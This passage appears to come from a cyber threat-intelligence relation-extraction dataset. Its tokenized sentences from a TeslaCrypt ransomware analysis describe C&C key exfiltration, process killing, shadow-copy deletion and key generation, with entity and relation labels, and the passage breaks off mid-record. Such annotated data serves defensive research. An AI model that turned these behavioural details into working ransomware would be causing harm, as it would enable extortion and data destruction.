[{"type": "SF", "sent_id": 6, "global_pos": [193, 193], "name": "LAN network statistics", "pos": [13, 16], "index": "19_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [206, 206], "name": "Windows Crypto", "pos": [26, 28], "index": "20_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [216, 216], "name": "process descriptors", "pos": [36, 38], "index": "21_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [225, 225], "name": "loaded modules", "pos": [45, 47], "index": "22_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [233, 233], "name": "physical memory", "pos": [53, 55], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [241, 241], "name": "it", "pos": [61, 62], "index": "24_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [247, 247], "name": "SHA1 values", "pos": [67, 69], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [262, 262], "name": "it", "pos": [3, 4], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [267, 267], "name": "global SHA1 value", "pos": [8, 11], "index": "27_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [283, 283], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "28_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 11}, {"r": "RD", "evidence": [1], "t": 2, "h": 4}, {"r": "ST", "evidence": [1], "t": 3, "h": 4}, {"r": "RF", "evidence": [1], "t": 3, "h": 4}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "RF", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "FR", "evidence": [2], "h": 6, "t": 8}, {"r": "UK", "evidence": [2], "t": 7, "h": 8}, {"r": "RD", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "WR", "evidence": [2], "t": 9, "h": 10}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "WR", "evidence": [2], "t": 9, "h": 10}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [3], "h": 12, "t": 14}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "FR", "evidence": [4, 5, 6], "h": 15, "t": 18}, {"r": "EX", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "RD", "evidence": [6], "h": 18, "t": 20}, {"r": "RD", "evidence": [6], "h": 18, "t": 21}, {"r": "RD", "evidence": [6], "h": 18, "t": 22}, {"r": "RD", "evidence": [6], "h": 18, "t": 23}, {"r": "WR", "evidence": [6], "h": 24, "t": 25}, {"r": "CO", "evidence": [6], "h": 18, "t": 24}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 26}, {"r": "WR", "evidence": [7], "h": 26, "t": 27}, {"r": "RD", "evidence": [7], "h": 26, "t": 28}]}, {"title": "663-11", "sents": [["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."], ["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"], ["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."], ["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."], ["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."], ["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."], ["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."], ["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [4, 4], "name": "encryption key", "pos": [4, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "C & C", "pos": [8, 11], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [13, 13], "name": "POST request", "pos": [13, 15], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [26, 26], "name": "C & C", "pos": [26, 29], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "TeslaCrypt", "pos": [8, 9], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [63, 63], "name": "process", "pos": [31, 32], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [68, 68], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "6_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [83, 83], "name": "Volume Shadow", "pos": [51, 53], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [88, 88], "name": "sample", "pos": [56, 57], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [92, 92], "name": "key.dat", "pos": [60, 61], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [95, 95], "name": "dropper", "pos": [1, 2], "index": "10_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [108, 108], "name": "payment key", "pos": [14, 16], "index": "11_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [113, 113], "name": "encryption key", "pos": [19, 21], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [117, 117], "name": "other dropper", "pos": [1, 3], "index": "13_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [130, 130], "name": "Recovery key", "pos": [14, 16], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [135, 135], "name": "GetAndHashOsData", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [155, 155], "name": "it", "pos": [2, 3], "index": "16_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [166, 166], "name": "LAN network statistics", "pos": [13, 16], "index": "17_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [179, 179], "name": "Windows Crypto", "pos": [26, 28], "index": "18_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [189, 189], "name": "process descriptors", "pos": [36, 38], "index": "19_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [198, 198], "name": "loaded modules", "pos": [45, 47], "index": "20_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [206, 206], "name": "physical memory", "pos": [53, 55], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [214, 214], "name": "it", "pos": [61, 62], "index": "22_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [220, 220], "name": "SHA1 values", "pos": [67, 69], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [235, 235], "name": "it", "pos": [3, 4], "index": "24_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [240, 240], "name": "global SHA1 value", "pos": [8, 11], "index": "25_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [256, 256], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [266, 266], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "27_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [274, 274], "name": "generic buffer", "pos": [15, 17], "index": "28_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [279, 279], "name": "data", "pos": [20, 21], "index": "29_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 2}, {"r": "ST", "evidence": [0], "t": 1, "h": 2}, {"r": "RF", "evidence": [0], "t": 1, "h": 2}, {"r": "ST", "evidence": [0], "h": 2, "t": 3}, {"r": "RF", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "UK", "evidence": [1], "t": 5, "h": 6}, {"r": "RD", "evidence": [1], "h": 6, "t": 7}, {"r": "RD", "evidence": [1], "h": 6, "t": 7}, {"r": "WR", "evidence": [1], "h": 6, "t": 7}, {"r": "RD", "evidence": [1], "t": 7, "h": 8}, {"r": "RD", "evidence": [1], "t": 7, "h": 8}, {"r": "WR", "evidence": [1], "t": 7, "h": 8}, {"r": "RD", "evidence": [1], "t": 7, "h": 8}, {"r": "RD", "evidence": [1], "t": 7, "h": 8}, {"r": "WR", "evidence": [1], "t": 7, "h": 8}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 12}, {"r": "WR", "evidence": [3], "h": 13, "t": 14}, {"r": "FR", "evidence": [3, 4, 5], "h": 13, "t": 16}, {"r": "EX", "evidence": [4, 5], "t": 15, "h": 16}, {"r": "RD", "evidence": [5], "h": 16, "t": 17}, {"r": "RD", "evidence": [5], "h": 16, "t": 18}, {"r": "RD", "evidence": [5], "h": 16, "t": 19}, {"r": "RD", "evidence": [5], "h": 16, "t": 20}, {"r": "RD", "evidence": [5], "h": 16, "t": 21}, {"r": "WR", "evidence": [5], "h": 22, "t": 23}, {"r": "CO", "evidence": [5], "h": 16, "t": 22}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 24}, {"r": "WR", "evidence": [6], "h": 24, "t": 25}, {"r": "RD", "evidence": [6], "h": 24, "t": 26}, {"r": "FR", "evidence": [6, 7], "h": 24, "t": 27}, {"r": "RD", "evidence": [7], "h": 27, "t": 28}, {"r": "WR", "evidence": [7], "h": 27, "t": 28}, {"r": "RD", "evidence": [7], "h": 27, "t": 28}, {"r": "WR", "evidence": [7], "h": 27, "t": 29}]}, {"title": "663-12", "sents": [["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"], ["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."], ["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."], ["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."], ["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."], ["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."], ["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."], ["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "TeslaCrypt", "pos": [8, 9], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [31, 31], "name": "process", "pos": [31, 32], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [36, 36], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [51, 51], "name": "Volume Shadow", "pos": [51, 53], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [56, 56], "name": "sample", "pos": [56, 57], "index": "4_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [60, 60], "name": "key.dat", "pos": [60, 61], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [63, 63], "name": "dropper", "pos": [1, 2], "index": "6_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [76, 76], "name": "payment key", "pos": [14, 16], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [81, 81], "name": "encryption key", "pos": [19, 21], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [85, 85], "name": "other dropper", "pos": [1, 3], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [98, 98], "name": "Recovery key", "pos": [14, 16], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "GetAndHashOsData", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [123, 123], "name": "it", "pos": [2, 3], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [134, 134], "name": "LAN network statistics", "pos": [13, 16], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [147, 147], "name": "Windows Crypto", "pos": [26, 28], "index": "14_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [157, 157], "name": "process descriptors", "pos": [36, 38], "index": "15_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [166, 166], "name": "loaded modules", "pos": [45, 47], "index": "16_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [174, 174], "name": "physical memory", "pos": [53, 55], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [182, 182], "name": "it", "pos": [61, 62], "index": "18_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [188, 188], "name": "SHA1 values", "pos": [67, 69], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [203, 203], "name": "it", "pos": [3, 4], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [208, 208], "name": "global SHA1 value", "pos": [8, 11], "index": "21_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [224, 224], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [234, 234], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "23_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [242, 242], "name": "generic buffer", "pos": [15, 17], "index": "24_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [247, 247], "name": "data", "pos": [20, 21], "index": "25_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [255, 255], "name": "master key", "pos": [1, 3], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [259, 259], "name": "payment key", "pos": [5, 7], "index": "27_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [276, 276], "name": "SHA256", "pos": [22, 23], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [282, 282], "name": "custom algorithm", "pos": [28, 30], "index": "29_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "UK", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0], "h": 2, "t": 3}, {"r": "RD", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "h": 6, "t": 7}, {"r": "WR", "evidence": [1], "h": 6, "t": 8}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "FR", "evidence": [2, 3, 4], "h": 9, "t": 12}, {"r": "EX", "evidence": [3, 4], "t": 11, "h": 12}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [4], "h": 12, "t": 15}, {"r": "RD", "evidence": [4], "h": 12, "t": 16}, {"r": "RD", "evidence": [4], "h": 12, "t": 17}, {"r": "WR", "evidence": [4], "h": 18, "t": 19}, {"r": "CO", "evidence": [4], "h": 12, "t": 18}, {"r": "CO", "evidence": [4, 5], "h": 12, "t": 20}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "RD", "evidence": [5], "h": 20, "t": 22}, {"r": "FR", "evidence": [5, 6], "h": 20, "t": 23}, {"r": "RD", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 24}, {"r": "RD", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 25}, {"r": "WR", "evidence": [6, 7], "h": 23, "t": 26}, {"r": "WR", "evidence": [6, 7], "h": 23, "t": 27}, {"r": "WR", "evidence": [6, 7], "h": 23, "t": 28}, {"r": "EX", "evidence": [6, 7], "h": 23, "t": 29}]}, {"title": "663-13", "sents": [["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."], ["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."], ["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."], ["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."], ["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."], ["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."], ["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."], ["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "dropper", "pos": [1, 2], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [14, 14], "name": "payment key", "pos": [14, 16], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [19, 19], "name": "encryption key", "pos": [19, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "other dropper", "pos": [1, 3], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [36, 36], "name": "Recovery key", "pos": [14, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [41, 41], "name": "GetAndHashOsData", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "it", "pos": [2, 3], "index": "6_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [72, 72], "name": "LAN network statistics", "pos": [13, 16], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [85, 85], "name": "Windows Crypto", "pos": [26, 28], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [95, 95], "name": "process descriptors", "pos": [36, 38], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [104, 104], "name": "loaded modules", "pos": [45, 47], "index": "10_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [112, 112], "name": "physical memory", "pos": [53, 55], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [120, 120], "name": "it", "pos": [61, 62], "index": "12_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [126, 126], "name": "SHA1 values", "pos": [67, 69], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [141, 141], "name": "it", "pos": [3, 4], "index": "14_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [146, 146], "name": "global SHA1 value", "pos": [8, 11], "index": "15_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [162, 162], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [172, 172], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "17_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [180, 180], "name": "generic buffer", "pos": [15, 17], "index": "18_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [185, 185], "name": "data", "pos": [20, 21], "index": "19_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [193, 193], "name": "master key", "pos": [1, 3], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [197, 197], "name": "payment key", "pos": [5, 7], "index": "21_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [214, 214], "name": "SHA256", "pos": [22, 23], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [220, 220], "name": "custom algorithm", "pos": [28, 30], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [236, 236], "name": "shifted SHA256 values", "pos": [2, 5], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [244, 244], "name": "key.dat", "pos": [10, 11], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "EX", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [3], "h": 6, "t": 9}, {"r": "RD", "evidence": [3], "h": 6, "t": 10}, {"r": "RD", "evidence": [3], "h": 6, "t": 11}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "CO", "evidence": [3], "h": 6, "t": 12}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 14}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4], "h": 14, "t": 16}, {"r": "FR", "evidence": [4, 5], "h": 14, "t": 17}, {"r": "RD", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "RD", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 19}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 20}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 22}, {"r": "EX", "evidence": [5, 6], "h": 17, "t": 23}, {"r": "WR", "evidence": [5, 6, 7], "h": 17, "t": 24}, {"r": "WR", "evidence": [5, 6, 7], "h": 17, "t": 25}]}, {"title": "663-14", "sents": [["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."], ["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."], ["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."], ["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."], ["With", "these", "2", "items", ",", "the", "``", "FillBuffWithEncryptedOsData", "''", "routine", "is", "able", "to", "fill", "a", "generic", "buffer", "with", "the", "calculated", "data", ",", "in", "a", "pseudo-random", "manner", "."], ["A", "master", "key", "and", "a", "payment", "key", "are", "generated", "using", "this", "function", "(", "each", "key", "is", "32", "bytes", "wide", ")", ",", "their", "SHA256", "is", "calculated", "and", "finally", "a", "custom", "algorithm", "is", "used", "to", "shift", "left", "and", "shift", "right", "the", "2", "keys", "."], ["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."], ["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "other dropper", "pos": [1, 3], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [14, 14], "name": "Recovery key", "pos": [14, 16], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "GetAndHashOsData", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "it", "pos": [2, 3], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [50, 50], "name": "LAN network statistics", "pos": [13, 16], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [63, 63], "name": "Windows Crypto", "pos": [26, 28], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [73, 73], "name": "process descriptors", "pos": [36, 38], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [82, 82], "name": "loaded modules", "pos": [45, 47], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [90, 90], "name": "physical memory", "pos": [53, 55], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [98, 98], "name": "it", "pos": [61, 62], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [104, 104], "name": "SHA1 values", "pos": [67, 69], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [119, 119], "name": "it", "pos": [3, 4], "index": "11_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [124, 124], "name": "global SHA1 value", "pos": [8, 11], "index": "12_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [140, 140], "name": "g_lpGlobalOsDataSha1", "pos": [24, 25], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [150, 150], "name": "FillBuffWithEncryptedOsData", "pos": [7, 8], "index": "14_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [158, 158], 